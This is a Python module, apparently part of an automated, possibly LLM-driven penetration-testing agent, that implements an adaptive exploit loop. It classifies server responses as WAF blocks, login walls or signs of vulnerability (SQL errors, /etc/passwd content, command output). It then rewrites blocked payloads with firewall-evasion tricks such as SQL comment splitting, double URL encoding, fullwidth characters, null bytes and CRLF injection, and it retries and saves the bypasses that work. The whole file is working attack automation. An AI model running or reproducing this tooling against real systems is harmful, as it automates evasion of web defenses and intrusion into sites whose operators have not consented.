"""
Adaptive Payload Mutation — Response Fingerprinting + Mutation Strategies.

3-layer exploit adaptation system:
  Layer 1: ResponseClassifier — categorizes tool/HTTP responses
  Layer 2: AdaptivePayloadMutator — deterministic mutation list per category
  Layer 3: ExploitLoop — iterative classify → mutate → retry cycle

When WAF is detected, the system doesn't hope LLM does something different.
It applies deterministic bypass strategies in priority order. Successful strategies
are recorded in PersistentMemory for cross-session learning.

Usage:
    classifier = ResponseClassifier()
    mutator = AdaptivePayloadMutator(memory=persistent_memory)
    loop = ExploitLoop(classifier, mutator, kg, memory)

    result = await loop.run(hypothesis, tool_fn)
    # → Tries payload, classifies response, mutates, retries
    # → Writes successful strategies to memory
"""
from __future__ import annotations

import base64
import logging
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger("redclaw.adaptive_mutation")


# ── Response Classifications ──────────────────────────────────────────────────


class ResponseClass(str, Enum):
    """Classification of a tool/HTTP response."""
    WAF_DETECTED = "waf_detected"
    AUTH_REQUIRED = "auth_required"
    RATE_LIMITED = "rate_limited"
    VULNERABLE = "vulnerable"
    NOT_FOUND = "not_found"
    SERVER_ERROR = "server_error"
    TIMEOUT = "timeout"
    CONNECTION_REFUSED = "connection_refused"
    SUCCESS_NO_VULN = "success_no_vuln"
    UNKNOWN = "unknown"


@dataclass
class ClassifiedResponse:
    """A response with its classification and extracted signals."""
    classification: ResponseClass
    status_code: int = 0
    body_length: int = 0
    signals: List[str] = field(default_factory=list)
    raw_snippet: str = ""       # First 500 chars of response
    confidence: float = 0.0     # How confident the classification is

    @property
    def is_blocking(self) -> bool:
        """Is this response indicating an active defense?"""
        return self.classification in (
            ResponseClass.WAF_DETECTED,
            ResponseClass.AUTH_REQUIRED,
            ResponseClass.RATE_LIMITED,
        )

    @property
    def is_vulnerable(self) -> bool:
        return self.classification == ResponseClass.VULNERABLE


# ── Response Classifier ───────────────────────────────────────────────────────


# Pattern tuples: (pattern_or_lambda, confidence, signal_description)
_WAF_PATTERNS = [
    (r"cloudflare", 0.95, "Cloudflare WAF"),
    (r"mod_security|modsecurity", 0.90, "ModSecurity WAF"),
    (r"aws[- ]?waf", 0.90, "AWS WAF"),
    (r"imperva|incapsula", 0.90, "Imperva WAF"),
    (r"akamai", 0.85, "Akamai WAF"),
    (r"sucuri", 0.85, "Sucuri WAF"),
    (r"barracuda", 0.80, "Barracuda WAF"),
    (r"f5[- ]big[- ]?ip", 0.80, "F5 BIG-IP"),
    (r"blocked|forbidden|access denied|request rejected", 0.70, "Generic block"),
    (r"your request has been blocked", 0.85, "Explicit block message"),
    (r"security policy", 0.75, "Security policy enforcement"),
    (r"web application firewall", 0.95, "Explicit WAF mention"),
    (r"captcha|challenge", 0.70, "CAPTCHA/challenge detected"),
]

_VULN_PATTERNS = [
    (r"sql syntax.*error", 0.90, "SQL syntax error"),
    (r"error in your sql", 0.90, "SQL error message"),
    (r"mysql.*error", 0.85, "MySQL error"),
    (r"postgresql.*error|pg_.*error", 0.85, "PostgreSQL error"),
    (r"ora-\d{5}", 0.90, "Oracle error code"),
    (r"microsoft.*odbc|ole db", 0.85, "MSSQL/ODBC error"),
    (r"stack trace|traceback|at .*\.java:\d+", 0.80, "Stack trace leak"),
    (r"warning.*include|failed to open stream", 0.85, "PHP file inclusion"),
    (r"root:.*:0:0", 0.95, "/etc/passwd content"),
    (r"\[boot loader\]|\\windows\\system32", 0.90, "Windows system file"),
    (r"uid=\d+.*gid=\d+", 0.95, "Command execution (id output)"),
    (r"<\?php|<\?=", 0.85, "PHP source code leak"),
    (r"secret|api[_-]?key|private[_-]?key|password\s*[:=]", 0.80, "Secret/key leak"),
]

_AUTH_PATTERNS = [
    (r"login|sign[- ]?in|log[- ]?in", 0.70, "Login page redirect"),
    (r"unauthorized|authentication required", 0.85, "Auth required"),
    (r"www-authenticate", 0.90, "WWW-Authenticate header"),
    (r"invalid.*credentials|bad.*password", 0.80, "Invalid creds"),
    (r"session.*expired|token.*expired", 0.80, "Session expired"),
]


class ResponseClassifier:
    """Classify tool output / HTTP responses into actionable categories.

    Checks status codes, body patterns, and header patterns to determine
    if a response indicates WAF, auth requirement, vulnerability, etc.
    """

    def classify(
        self,
        output: str,
        status_code: int = 0,
        headers: Optional[Dict[str, str]] = None,
    ) -> ClassifiedResponse:
        """Classify a response.

        Args:
            output: Raw tool output or HTTP body
            status_code: HTTP status code (0 if not HTTP)
            headers: HTTP headers dict (optional)

        Returns:
            ClassifiedResponse with category and signals
        """
        headers = headers or {}
        signals: List[str] = []
        best_class = ResponseClass.UNKNOWN
        best_confidence = 0.0
        output_lower = output.lower()
        header_str = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()
        combined = output_lower + " " + header_str

        # ── Status code based classification ──
        if status_code == 403:
            signals.append(f"HTTP 403 Forbidden")
            if best_confidence < 0.60:
                best_class = ResponseClass.WAF_DETECTED
                best_confidence = 0.60

        elif status_code == 401:
            signals.append("HTTP 401 Unauthorized")
            best_class = ResponseClass.AUTH_REQUIRED
            best_confidence = 0.85

        elif status_code == 429:
            signals.append("HTTP 429 Too Many Requests")
            best_class = ResponseClass.RATE_LIMITED
            best_confidence = 0.95

        elif status_code == 404:
            signals.append("HTTP 404 Not Found")
            best_class = ResponseClass.NOT_FOUND
            best_confidence = 0.90

        elif status_code == 406:
            signals.append("HTTP 406 Not Acceptable (WAF indicator)")
            best_class = ResponseClass.WAF_DETECTED
            best_confidence = 0.80

        elif status_code >= 500:
            signals.append(f"HTTP {status_code} Server Error")
            best_class = ResponseClass.SERVER_ERROR
            best_confidence = 0.70

        elif status_code == 302 or status_code == 301:
            location = headers.get("location", "").lower()
            if "login" in location or "signin" in location or "auth" in location:
                signals.append(f"Redirect to login: {location}")
                best_class = ResponseClass.AUTH_REQUIRED
                best_confidence = 0.85

        # ── Timeout / connection errors ──
        if any(kw in output_lower for kw in
               ["timed out", "timeout", "connection timed out", "etimedout"]):
            signals.append("Connection timeout")
            best_class = ResponseClass.TIMEOUT
            best_confidence = 0.95

        if any(kw in output_lower for kw in
               ["connection refused", "econnrefused", "no route to host"]):
            signals.append("Connection refused")
            best_class = ResponseClass.CONNECTION_REFUSED
            best_confidence = 0.95

        # ── WAF pattern check (highest priority override) ──
        for pattern, conf, descr in _WAF_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                signals.append(f"WAF: {descr}")
                if conf > best_confidence:
                    best_class = ResponseClass.WAF_DETECTED
                    best_confidence = conf

        # ── Vulnerability pattern check (overrides most) ──
        for pattern, conf, descr in _VULN_PATTERNS:
            if re.search(pattern, combined, re.IGNORECASE):
                signals.append(f"VULN: {descr}")
                if conf > best_confidence:
                    best_class = ResponseClass.VULNERABLE
                    best_confidence = conf

        # ── Auth pattern check ──
        if best_class != ResponseClass.VULNERABLE:
            for pattern, conf, descr in _AUTH_PATTERNS:
                if re.search(pattern, combined, re.IGNORECASE):
                    signals.append(f"AUTH: {descr}")
                    if conf > best_confidence:
                        best_class = ResponseClass.AUTH_REQUIRED
                        best_confidence = conf

        # ── Silent block detection (200 with tiny body) ──
        if status_code == 200 and len(output) < 50 and not signals:
            signals.append("Suspiciously small 200 response (possible silent block)")
            if best_confidence < 0.50:
                best_class = ResponseClass.WAF_DETECTED
                best_confidence = 0.50

        # ── Successful but not vulnerable ──
        if (best_class == ResponseClass.UNKNOWN and
                status_code in (200, 301, 302) and len(output) > 50):
            best_class = ResponseClass.SUCCESS_NO_VULN
            best_confidence = 0.60

        return ClassifiedResponse(
            classification=best_class,
            status_code=status_code,
            body_length=len(output),
            signals=signals,
            raw_snippet=output[:500],
            confidence=best_confidence,
        )


# ── Mutation Strategies ───────────────────────────────────────────────────────


class MutationStrategy(str, Enum):
    """Available payload mutation strategies."""
    # WAF bypass
    CASE_VARIATION = "case_variation"
    COMMENT_INJECTION = "comment_injection"
    UNICODE_NORMALIZATION = "unicode_normalization"
    DOUBLE_URL_ENCODE = "double_url_encode"
    CHUNKED_TRANSFER = "chunked_transfer"
    HPP = "http_parameter_pollution"
    NULL_BYTE = "null_byte_injection"
    NEWLINE_INJECTION = "newline_injection"

    # Auth bypass
    DEFAULT_CREDENTIALS = "default_credentials"
    HEADER_MANIPULATION = "header_manipulation"
    METHOD_OVERRIDE = "method_override"

    # General
    BASELINE_RETRY = "baseline_retry"
    ENCODING_SWITCH = "encoding_switch"
    DELAY_RETRY = "delay_retry"


# Response class → ordered mutation strategies (most effective first)
MUTATION_STRATEGIES: Dict[str, List[MutationStrategy]] = {
    ResponseClass.WAF_DETECTED: [
        MutationStrategy.CASE_VARIATION,
        MutationStrategy.COMMENT_INJECTION,
        MutationStrategy.DOUBLE_URL_ENCODE,
        MutationStrategy.UNICODE_NORMALIZATION,
        MutationStrategy.HPP,
        MutationStrategy.CHUNKED_TRANSFER,
        MutationStrategy.NULL_BYTE,
        MutationStrategy.NEWLINE_INJECTION,
    ],
    ResponseClass.AUTH_REQUIRED: [
        MutationStrategy.DEFAULT_CREDENTIALS,
        MutationStrategy.HEADER_MANIPULATION,
        MutationStrategy.METHOD_OVERRIDE,
    ],
    ResponseClass.RATE_LIMITED: [
        MutationStrategy.DELAY_RETRY,
    ],
    ResponseClass.UNKNOWN: [
        MutationStrategy.BASELINE_RETRY,
        MutationStrategy.ENCODING_SWITCH,
    ],
    ResponseClass.SUCCESS_NO_VULN: [
        MutationStrategy.ENCODING_SWITCH,
        MutationStrategy.BASELINE_RETRY,
    ],
}


@dataclass
class MutatedPayload:
    """A mutated payload with metadata."""
    payload: str
    strategy: MutationStrategy
    confidence: float
    description: str


class AdaptivePayloadMutator:
    """Apply deterministic mutation strategies based on response classification.

    When a WAF is detected, applies bypass techniques in order.
    When auth is required, tries default creds and header manipulation.
    Tracks which strategies have been tried to avoid repetition.

    Cross-session learning: if PersistentMemory is provided, checks which
    strategies have worked before for this response class.
    """

    def __init__(self, memory: Any = None):
        self.memory = memory
        self._tried: Dict[str, set] = {}  # response_class → set of tried strategies

    def mutate(
        self,
        original_payload: str,
        response_class: ResponseClass,
        hypothesis_id: str = "",
    ) -> List[MutatedPayload]:
        """Generate mutations for a payload based on response classification.

        Args:
            original_payload: The payload that was blocked/failed
            response_class: Classification of the response
            hypothesis_id: For tracking which strategies were tried

        Returns:
            List of MutatedPayload sorted by confidence (highest first)
        """
        rc_key = response_class.value if hasattr(response_class, 'value') else str(response_class)
        strategies = MUTATION_STRATEGIES.get(response_class, [MutationStrategy.BASELINE_RETRY])

        # Filter out already-tried strategies for this hypothesis
        tried = self._tried.get(hypothesis_id, set())
        remaining = [s for s in strategies if s not in tried]

        if not remaining:
            return []  # All strategies exhausted

        # Check memory for historically successful strategies
        memory_boost = {}
        if self.memory:
            try:
                recall = self.memory.recall_mutations(rc_key) if hasattr(self.memory, 'recall_mutations') else {}
                memory_boost = recall  # strategy_name → success_count
            except Exception:
                pass

        mutations: List[MutatedPayload] = []
        for strategy in remaining:
            mutated = self._apply_mutation(original_payload, strategy)
            base_conf = self._strategy_confidence(strategy, response_class)

            # Boost from memory
            boost = memory_boost.get(strategy.value, 0) * 0.05
            confidence = min(1.0, base_conf + boost)

            mutations.append(MutatedPayload(
                payload=mutated,
                strategy=strategy,
                confidence=confidence,
                description=f"{strategy.value} against {rc_key}",
            ))

        # Sort by confidence descending
        mutations.sort(key=lambda m: m.confidence, reverse=True)
        return mutations

    def mark_tried(self, hypothesis_id: str, strategy: MutationStrategy):
        """Mark a strategy as tried for a hypothesis."""
        if hypothesis_id not in self._tried:
            self._tried[hypothesis_id] = set()
        self._tried[hypothesis_id].add(strategy)

    def _apply_mutation(self, payload: str, strategy: MutationStrategy) -> str:
        """Apply a specific mutation to a payload."""
        if strategy == MutationStrategy.CASE_VARIATION:
            # SeLeCt instead of SELECT
            result = []
            for i, c in enumerate(payload):
                if c.isalpha():
                    result.append(c.upper() if i % 2 == 0 else c.lower())
                else:
                    result.append(c)
            return "".join(result)

        elif strategy == MutationStrategy.COMMENT_INJECTION:
            # SE/**/LECT, UN/**/ION
            sql_keywords = ["SELECT", "UNION", "FROM", "WHERE", "INSERT",
                            "UPDATE", "DELETE", "DROP", "AND", "OR"]
            result = payload
            for kw in sql_keywords:
                if kw.lower() in result.lower():
                    mid = len(kw) // 2
                    replacement = kw[:mid] + "/**/" + kw[mid:]
                    result = re.sub(re.escape(kw), replacement, result, flags=re.IGNORECASE)
            return result

        elif strategy == MutationStrategy.DOUBLE_URL_ENCODE:
            # ' → %27 → %2527
            result = payload
            encodes = {"'": "%2527", '"': "%2522", " ": "%2520",
                       "<": "%253C", ">": "%253E", "(": "%2528", ")": "%2529"}
            for char, enc in encodes.items():
                result = result.replace(char, enc)
            return result

        elif strategy == MutationStrategy.UNICODE_NORMALIZATION:
            # Use unicode alternatives for common SQL/JS characters
            unicode_map = {
                "'": "\uff07",   # Fullwidth apostrophe
                '"': "\uff02",   # Fullwidth quotation
                "<": "\uff1c",   # Fullwidth less-than
                ">": "\uff1e",   # Fullwidth greater-than
                "/": "\uff0f",   # Fullwidth solidus
                "\\": "\uff3c",  # Fullwidth reverse solidus
            }
            result = payload
            for char, uni in unicode_map.items():
                result = result.replace(char, uni)
            return result

        elif strategy == MutationStrategy.HPP:
            # Duplicate parameter: param=safe&param=malicious
            if "=" in payload:
                key, _, value = payload.partition("=")
                return f"{key}=safe&{key}={value}"
            return payload

        elif strategy == MutationStrategy.NULL_BYTE:
            # Inject null byte before extension: file.php%00.jpg
            return payload + "%00"

        elif strategy == MutationStrategy.NEWLINE_INJECTION:
            # CRLF injection: header\r\nX-Injected: true
            return payload + "%0d%0aX-Injected:%20true"

        elif strategy == MutationStrategy.CHUNKED_TRANSFER:
            # Indicate chunked transfer should be used (flag for executor)
            return f"CHUNKED:{payload}"

        elif strategy == MutationStrategy.HEADER_MANIPULATION:
            # X-Forwarded-For bypass (flag for executor)
            return f"HEADER_BYPASS:{payload}"

        elif strategy == MutationStrategy.METHOD_OVERRIDE:
            # X-HTTP-Method-Override (flag for executor)
            return f"METHOD_OVERRIDE:{payload}"

        elif strategy == MutationStrategy.DEFAULT_CREDENTIALS:
            return payload  # Strategy is about trying default creds, not mutating payload

        elif strategy == MutationStrategy.ENCODING_SWITCH:
            # Base64 encode the payload
            encoded = base64.b64encode(payload.encode()).decode()
            return encoded

        elif strategy == MutationStrategy.DELAY_RETRY:
            return payload  # Same payload, executor adds delay

        elif strategy == MutationStrategy.BASELINE_RETRY:
            return payload  # Straight retry

        return payload

    def _strategy_confidence(self, strategy: MutationStrategy, response_class: ResponseClass) -> float:
        """Base confidence score for each strategy."""
        scores = {
            MutationStrategy.CASE_VARIATION: 0.60,
            MutationStrategy.COMMENT_INJECTION: 0.65,
            MutationStrategy.DOUBLE_URL_ENCODE: 0.55,
            MutationStrategy.UNICODE_NORMALIZATION: 0.50,
            MutationStrategy.HPP: 0.45,
            MutationStrategy.CHUNKED_TRANSFER: 0.70,
            MutationStrategy.NULL_BYTE: 0.40,
            MutationStrategy.NEWLINE_INJECTION: 0.35,
            MutationStrategy.DEFAULT_CREDENTIALS: 0.50,
            MutationStrategy.HEADER_MANIPULATION: 0.55,
            MutationStrategy.METHOD_OVERRIDE: 0.40,
            MutationStrategy.BASELINE_RETRY: 0.20,
            MutationStrategy.ENCODING_SWITCH: 0.30,
            MutationStrategy.DELAY_RETRY: 0.75,
        }
        return scores.get(strategy, 0.30)


# ── Exploit Loop ──────────────────────────────────────────────────────────────


@dataclass
class ExploitAttempt:
    """Record of a single exploit attempt within the loop."""
    iteration: int
    payload: str
    strategy: Optional[MutationStrategy]
    response_class: ResponseClass
    status_code: int
    signals: List[str]
    duration: float


class ExploitResult(str, Enum):
    SUCCESS = "success"
    FAILED = "failed"
    EXHAUSTED = "exhausted"       # All mutation strategies tried
    MAX_ITERATIONS = "max_iterations"


@dataclass
class ExploitLoopResult:
    """Final result of the exploit loop."""
    outcome: ExploitResult
    hypothesis_id: str
    attempts: List[ExploitAttempt]
    successful_strategy: Optional[MutationStrategy] = None
    evidence: str = ""
    total_duration: float = 0.0

    @property
    def display(self) -> str:
        icon = "✅" if self.outcome == ExploitResult.SUCCESS else "❌"
        return (f"{icon} {self.hypothesis_id}: {self.outcome.value} "
                f"({len(self.attempts)} attempts, {self.total_duration:.1f}s)")


class ExploitLoop:
    """Iterative exploit execution with response classification and mutation.

    Flow per iteration:
      1. Execute tool with current payload
      2. Classify response → waf_detected / auth_required / vulnerable / ...
      3. If vulnerable → SUCCESS, record strategy
      4. If blocking → get next mutation from AdaptivePayloadMutator
      5. Apply mutation → retry
      6. If all mutations exhausted → FAILED

    Cross-session learning:
      - Successful strategies are written to PersistentMemory
      - Next session, these strategies are tried first

    Usage:
        loop = ExploitLoop(
            classifier=ResponseClassifier(),
            mutator=AdaptivePayloadMutator(memory=persistent_memory),
            kg=self.kg,
            memory=persistent_memory,
        )
        result = await loop.run(
            hypothesis_id="hyp:CVE-2021-23017:80",
            initial_payload="' OR 1=1 --",
            tool_fn=execute_tool,
            max_iterations=10,
        )
    """

    def __init__(
        self,
        classifier: ResponseClassifier,
        mutator: AdaptivePayloadMutator,
        kg: Any = None,
        memory: Any = None,
        log_fn: Optional[Callable] = None,
    ):
        self.classifier = classifier
        self.mutator = mutator
        self.kg = kg
        self.memory = memory
        self._log = log_fn or (lambda msg: logger.info(msg))

    async def run(
        self,
        hypothesis_id: str,
        initial_payload: str,
        tool_fn: Callable,
        max_iterations: int = 10,
    ) -> ExploitLoopResult:
        """Run the adaptive exploit loop.

        Args:
            hypothesis_id: ID of the hypothesis being tested
            initial_payload: Starting payload
            tool_fn: Async callable(payload) → (output, status_code, headers)
            max_iterations: Maximum attempts before giving up

        Returns:
            ExploitLoopResult with outcome, attempts, and evidence
        """
        start_time = time.time()
        attempts: List[ExploitAttempt] = []
        payload = initial_payload
        current_strategy: Optional[MutationStrategy] = None

        self._log(f"  🔄 ExploitLoop: {hypothesis_id} — max {max_iterations} iterations")

        for iteration in range(max_iterations):
            iter_start = time.time()

            # ── Step 1: Execute tool ──
            try:
                output, status_code, headers = await tool_fn(payload)
            except Exception as e:
                output = str(e)
                status_code = 0
                headers = {}

            # ── Step 2: Classify response ──
            classified = self.classifier.classify(output, status_code, headers)
            iter_duration = time.time() - iter_start

            attempt = ExploitAttempt(
                iteration=iteration,
                payload=payload[:200],
                strategy=current_strategy,
                response_class=classified.classification,
                status_code=status_code,
                signals=classified.signals,
                duration=iter_duration,
            )
            attempts.append(attempt)

            self._log(f"    [{iteration}] {classified.classification.value} "
                      f"(code={status_code}, signals={classified.signals[:2]}) "
                      f"strategy={current_strategy}")

            # ── Step 3: Write to KG ──
            if self.kg:
                try:
                    self.kg.set_capability(
                        f"exploit_attempt:{hypothesis_id}:{iteration}",
                        {
                            "response_class": classified.classification.value,
                            "status_code": status_code,
                            "strategy": current_strategy.value if current_strategy else None,
                            "signals": classified.signals[:3],
                        }
                    )
                except Exception:
                    pass

            # ── Step 4: Check if vulnerable ──
            if classified.is_vulnerable:
                self._log(f"  ✅ VULNERABLE at iteration {iteration}!")
                result = ExploitLoopResult(
                    outcome=ExploitResult.SUCCESS,
                    hypothesis_id=hypothesis_id,
                    attempts=attempts,
                    successful_strategy=current_strategy,
                    evidence=output[:1000],
                    total_duration=time.time() - start_time,
                )
                # Record successful strategy in memory
                self._record_mutation_success(
                    classified.classification, current_strategy
                )
                return result

            # ── Step 5: Get next mutation ──
            if classified.is_blocking:
                mutations = self.mutator.mutate(
                    payload, classified.classification, hypothesis_id
                )

                if not mutations:
                    self._log(f"  ❌ All mutations exhausted for {classified.classification.value}")
                    return ExploitLoopResult(
                        outcome=ExploitResult.EXHAUSTED,
                        hypothesis_id=hypothesis_id,
                        attempts=attempts,
                        total_duration=time.time() - start_time,
                    )

                # Pick best mutation
                best = mutations[0]
                payload = best.payload
                current_strategy = best.strategy
                self.mutator.mark_tried(hypothesis_id, best.strategy)

                self._log(f"    → Mutation: {best.strategy.value} "
                          f"(confidence={best.confidence:.0%})")
            else:
                # Not blocking but not vulnerable either — try encoding switch
                mutations = self.mutator.mutate(
                    payload, ResponseClass.UNKNOWN, hypothesis_id
                )
                if mutations:
                    best = mutations[0]
                    payload = best.payload
                    current_strategy = best.strategy
                    self.mutator.mark_tried(hypothesis_id, best.strategy)
                else:
                    break  # Nothing more to try

        return ExploitLoopResult(
            outcome=ExploitResult.MAX_ITERATIONS,
            hypothesis_id=hypothesis_id,
            attempts=attempts,
            total_duration=time.time() - start_time,
        )

    def _record_mutation_success(
        self,
        response_class: ResponseClass,
        strategy: Optional[MutationStrategy],
    ):
        """Write successful strategy to memory for cross-session learning."""
        if not self.memory or not strategy:
            return
        try:
            if hasattr(self.memory, 'commit_attempt'):
                # Use the persistent memory's general mechanism
                self.memory.commit_attempt(
                    session_id="mutation_log",
                    target="*",
                    fingerprint=f"mutation:{response_class.value}",
                    service="adaptive_mutation",
                    version="",
                    port=0,
                    cve=f"MUTATION:{response_class.value}:{strategy.value}",
                    attack_vector=strategy.value,
                    result="success",
                    confidence_delta=0.3,
                    evidence=f"Strategy {strategy.value} bypassed {response_class.value}",
                )
                logger.info(f"Mutation success recorded: {strategy.value} vs {response_class.value}")
        except Exception as e:
            logger.warning(f"Failed to record mutation success: {e}")

    def get_summary(self, result: ExploitLoopResult) -> str:
        """Human-readable summary of the exploit loop."""
        lines = [f"ExploitLoop Result: {result.display}"]

        # Group attempts by response class
        by_class: Dict[str, int] = {}
        for a in result.attempts:
            key = a.response_class.value
            by_class[key] = by_class.get(key, 0) + 1

        lines.append(f"  Response breakdown: {by_class}")

        if result.successful_strategy:
            lines.append(f"  ✅ Winning strategy: {result.successful_strategy.value}")

        # Strategies tried
        strategies_tried = [a.strategy.value for a in result.attempts if a.strategy]
        if strategies_tried:
            lines.append(f"  Strategies tried: {strategies_tried}")

        return "\n".join(lines)
